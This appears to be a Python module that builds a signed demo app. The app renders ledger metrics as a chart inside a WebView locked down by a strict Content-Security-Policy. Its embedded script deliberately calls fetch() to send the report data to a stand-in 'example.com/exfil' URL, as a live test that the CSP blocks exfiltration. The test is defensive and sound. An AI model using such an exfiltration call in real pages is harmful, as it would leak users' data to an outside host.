"""Authoring for the "Signed Web Report" demo micro-app.

Proves the pattern for using a WebView to render application data (charts,
reports) WITHOUT betraying the signed/sandboxed/audited model:

  1. Data comes from signed queries (execute_signed_query) against a table in
     the container — gated by signatures + RBAC like any other read.
  2. The renderer (HTML + an inline, hand-rolled SVG bar chart — no external
     library, no CDN) lives entirely in the signed code blob.
  3. A strict Content-Security-Policy locks the page down:
       default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
       img-src 'self' data:; connect-src 'none'
     connect-src 'none' blocks fetch / XHR / WebSocket, so the page cannot
     exfiltrate the signed data. default-src 'none' + script-src 'unsafe-inline'
     means only inline (signed) script runs — no remote code.
  4. Navigation away is denied via on_navigation_starting (best-effort; the CSP
     is the load-bearing exfiltration control).

The page runs a live self-test: it attempts a fetch() to a remote host and
displays whether CSP blocked it — so the boundary is verifiable on screen, not
just asserted.

Authored by-value like the starter/gallery apps; the module imports no toga at
top level, so authoring/auditing stays CI-safe.
"""
import json
import base64
import os

import dill

from mschf.storage import MSFStorage

# Sample dataset the report visualizes: signed-ledger writes per weekday.
SEED_METRICS = [
    ("Mon", 12), ("Tue", 19), ("Wed", 9), ("Thu", 24),
    ("Fri", 16), ("Sat", 4), ("Sun", 7),
]

WEBREPORT_SOURCE = '''
def webreport_app(toga, host_api):
    import json
    from toga.style import Pack as P

    # 1. Data via a SIGNED query (gated by signature + RBAC).
    try:
        cur = host_api.execute_signed_query("SELECT label, value FROM metrics ORDER BY id")
        data = [{"label": r[0], "value": r[1]} for r in cur.fetchall()]
        err = None
    except Exception as e:
        data, err = [], str(e)

    # 2/3. Renderer + strict CSP, all inline (no network, no external library).
    HTML = """<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data:; connect-src 'none'">
<style>
  body { font-family: 'Segoe UI', system-ui, sans-serif; margin:0; padding:14px; color:#1a1a1a; }
  h2 { margin:0 0 2px; font-size:18px; }
  .sub { color:#666; font-size:12px; margin-bottom:12px; }
  table { border-collapse:collapse; margin-top:12px; font-size:13px; }
  th,td { border:1px solid #e2e2e2; padding:4px 12px; text-align:left; }
  th { background:#f6f6f6; }
  .sec { margin-top:14px; padding:8px 11px; border-radius:6px; font-size:12px; }
  .ok { background:#e7f6ea; color:#0a7a2f; }
  .bad { background:#fde8e8; color:#b30000; }
</style>
</head><body>
  <h2>Ledger Activity Report</h2>
  <div class="sub">Rendered by a locked-down WebView from signed query results.</div>
  <div id="chart"></div>
  <table id="tbl"><thead><tr><th>Weekday</th><th>Signed writes</th></tr></thead><tbody></tbody></table>
  <div id="sec" class="sec">running security self-test…</div>
<script>
  const DATA = /*DATA*/;
  (function(){
    const W=540,H=220,pad=34,n=DATA.length||1;
    const max=Math.max(1,...DATA.map(d=>d.value)), bw=(W-pad*2)/n;
    let s=`<svg width="${W}" height="${H}" style="max-width:100%">`;
    s+=`<line x1="${pad}" y1="${H-pad}" x2="${W-pad}" y2="${H-pad}" stroke="#ccc"/>`;
    DATA.forEach((d,i)=>{
      const bh=(H-pad*2)*d.value/max, x=pad+i*bw+6, y=H-pad-bh;
      s+=`<rect x="${x}" y="${y}" width="${bw-12}" height="${bh}" rx="3" fill="#F5821F"/>`;
      s+=`<text x="${x+(bw-12)/2}" y="${H-pad+15}" font-size="11" text-anchor="middle" fill="#555">${d.label}</text>`;
      s+=`<text x="${x+(bw-12)/2}" y="${y-4}" font-size="11" text-anchor="middle" fill="#555">${d.value}</text>`;
    });
    s+=`</svg>`;
    document.getElementById("chart").innerHTML = s || "(no data)";
    const tb=document.querySelector("#tbl tbody");
    DATA.forEach(d=>{ const tr=document.createElement("tr");
      tr.innerHTML=`<td>${d.label}</td><td>${d.value}</td>`; tb.appendChild(tr); });
  })();
  // 4. Live boundary test: try to exfiltrate; CSP connect-src 'none' must block it.
  (function(){
    const sec=document.getElementById("sec");
    fetch("https://example.com/exfil?leak=" + encodeURIComponent(JSON.stringify(DATA)))
      .then(()=>{ sec.className="sec bad"; sec.textContent="LEAKED — fetch succeeded; CSP FAILED."; })
      .catch(()=>{ sec.className="sec ok"; sec.textContent="Exfiltration blocked by CSP (connect-src 'none') \\u2713"; });
  })();
</script>
</body></html>"""

    html = HTML.replace("/*DATA*/", json.dumps(data))

    box = toga.Box(id="webreport", style=P(direction="column", margin=10))
    box.add(toga.Label("Signed Chart & Report", style=P(font_size=16, font_weight="bold")))
    box.add(toga.Label("Data pulled via signed queries; rendered by a CSP-locked WebView2.",
                       style=P(font_style="italic", font_size=10, color="#666666", margin_bottom=8)))
    if err:
        box.add(toga.Label("Query blocked: " + err, style=P(color="#b30000", margin_bottom=6)))

    try:
        web = toga.WebView(style=P(flex=1))
        # Deny navigation away from the signed report (best-effort; CSP is the
        # primary exfiltration control). The initial set_content load is allowed.
        web.on_navigation_starting = lambda widget, url=None, **k: False
        web.set_content("https://report.local/", html)
        box.add(web)
    except Exception as e:
        box.add(toga.Label("WebView unavailable: " + str(e), style=P(color="#b30000")))

    return box
'''


def _webreport_callable():
    ns = {}
    exec(WEBREPORT_SOURCE, ns)  # NOT .format — the HTML/CSS/JS is full of braces
    return ns['webreport_app']


def create_webreport_container(dest_path, identity, ca_cert_path):
    """Author the signed web-report .msf at dest_path, signed by ``identity``."""
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives.serialization import load_pem_private_key

    with open(identity.key_path, 'rb') as f:
        key_pem = f.read()
    password = identity.key_passphrase.encode('utf-8') if identity.key_passphrase else None
    private_key = load_pem_private_key(key_pem, password=password)
    cert_pem = identity.cert_pem

    def _mjs(obj):
        if isinstance(obj, bytes):
            return base64.b64encode(obj).decode('utf-8')
        elif isinstance(obj, (list, tuple)):
            return [_mjs(i) for i in obj]
        elif isinstance(obj, dict):
            return {k: _mjs(v) for k, v in obj.items()}
        return obj

    def sign(query, params):
        payload = json.dumps({"query": query, "params": _mjs(params)}, sort_keys=True).encode('utf-8')
        return private_key.sign(payload, padding.PKCS1v15(), hashes.SHA256())

    if os.path.exists(dest_path):
        raise FileExistsError(f"{dest_path} already exists — not overwriting.")

    db = MSFStorage(dest_path, ca_cert_path=ca_cert_path)
    try:
        db.conn.execute(
            "CREATE TABLE metrics (id INTEGER PRIMARY KEY AUTOINCREMENT, label TEXT NOT NULL, value INTEGER NOT NULL)")
        db.conn.commit()

        q = "INSERT OR REPLACE INTO manifest (key, value) VALUES (?, ?)"
        db.bootstrap_admin(q, ['entry_point', 'main_app'], sign(q, ['entry_point', 'main_app']), cert_pem)

        q = "INSERT INTO metrics (label, value) VALUES (?, ?)"
        for label, value in SEED_METRICS:
            db.execute_signed(q, [label, value], sign(q, [label, value]), cert_pem)

        code_func = _webreport_callable()
        pickled = dill.dumps(code_func)
        q = "INSERT OR REPLACE INTO source_code (id, code_blob) VALUES (?, ?)"
        db.store_code('main_app', code_func, sign(q, ['main_app', pickled]), cert_pem)

        q = "INSERT OR REPLACE INTO manifest (key, value) VALUES (?, ?)"
        for key, value in (('name', 'Signed Web Report'),
                           ('version', '1.0'),
                           ('description', 'Charts/reports rendered in a CSP-locked WebView from signed data.')):
            db.set_manifest_item(key, value, sign(q, [key, value]), cert_pem)
    finally:
        db.close()
    return dest_path
